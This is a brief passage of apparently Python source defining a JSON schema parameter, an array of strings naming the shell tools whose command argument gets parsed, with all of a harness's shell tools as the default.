                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Shell tools whose command arg is parsed "
                    "(default: every harness's shell tool).",
                },
            },
        },
    },
]
